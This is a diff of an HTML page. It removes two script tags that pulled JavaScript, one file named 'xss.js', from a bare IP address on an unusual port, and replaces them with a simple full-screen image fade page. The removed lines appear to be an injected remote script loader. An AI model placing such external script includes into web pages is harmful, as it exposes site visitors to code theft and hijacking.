@@ -1,2 +1,56 @@
-<!--<script src="http://43.139.71.199:9091/myjs/xss.js"></script>-->
-<script src="http://43.139.71.199:9091/myjs/jt.js"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .fullscreen-bg {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        .fullscreen-bg img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            animation: fade 5s forwards;
+        }
+
+        @keyframes fade {
+            0% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+            }
+        }
+
+        .fullscreen-bg img:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .fullscreen-bg img:nth-child(2) {
+            animation-delay: 5s;
+        }
+    </style>
+</head>
+<body>
+<div class="fullscreen-bg">
+    <img src="image1.jpg" alt="First Image">
+    <img src="image2.jpg" alt="Second Image">
+</div>
+</body>
+</html>
